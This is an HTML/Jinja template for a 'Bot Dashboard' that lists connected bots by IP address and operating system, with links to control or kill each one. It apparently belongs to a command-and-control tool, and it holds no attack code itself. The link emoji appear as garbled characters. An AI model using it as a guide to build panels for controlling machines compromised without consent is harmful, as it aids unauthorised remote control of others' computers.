<html>
<head>
    <title>Bot Dashboard</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f7f9;
            margin: 0;
            padding: 20px;
        }

        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 40px;
        }

        table {
            width: 90%;
            margin: auto;
            border-collapse: collapse;
            background-color: white;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            overflow: hidden;
        }

        th, td {
            padding: 16px 20px;
            text-align: left;
        }

        th {
            background-color: #007bff;
            color: white;
            font-weight: normal;
            font-size: 16px;
        }

        tr:nth-child(even) {
            background-color: #f1f1f1;
        }

        tr:hover {
            background-color: #e6f2ff;
        }

        a {
            text-decoration: none;
            font-size: 18px;
        }

        a:hover {
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <h1>Connected Bots</h1>
    <table>
        <tr>
            <th>IP Address</th>
            <th>Operating System</th>
            <th>Control</th>
            <th>Terminate</th>
        </tr>
        {% for ip, details in bots.items() %}
        <tr>
            <td>{{ ip }}</td>
            <td>{{ details['os'] }}</td>
            <td><a href="/bot/{{ ip }}">üïπÔ∏è</a></td>
            <td><a href="/kill/{{ ip }}">üóëÔ∏è</a></td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
